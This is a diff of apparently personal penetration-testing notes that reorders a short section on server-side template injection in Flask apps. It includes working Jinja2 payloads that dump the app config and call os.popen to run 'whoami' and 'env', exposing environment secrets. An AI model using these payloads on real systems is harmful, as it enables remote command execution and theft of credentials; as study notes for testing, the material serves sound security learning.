@@ -429,12 +429,13 @@ THIS GIVES US ```{Microsoft.Compute/virtualMachines/runCommand/action}```
 #### Server Side Template Injection (SSTI)
 
 - If we know the app is running a template, we can do OS injection. 
-  - We know this app is running flask (from }config.items()} injection)
-  - Therefore we can just use the ```popen``` call from the ```os``` module: 
-
-
 ```
 {{config.items()}}
+```
+
+- We know this app is running flask (from }config.items()} injection)
+  - Therefore we can just use the ```popen``` call from the ```os``` module: 
+```
 {{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
 {{config.__class__.__init__.__globals__['os'].popen('env').read()}}
 ```
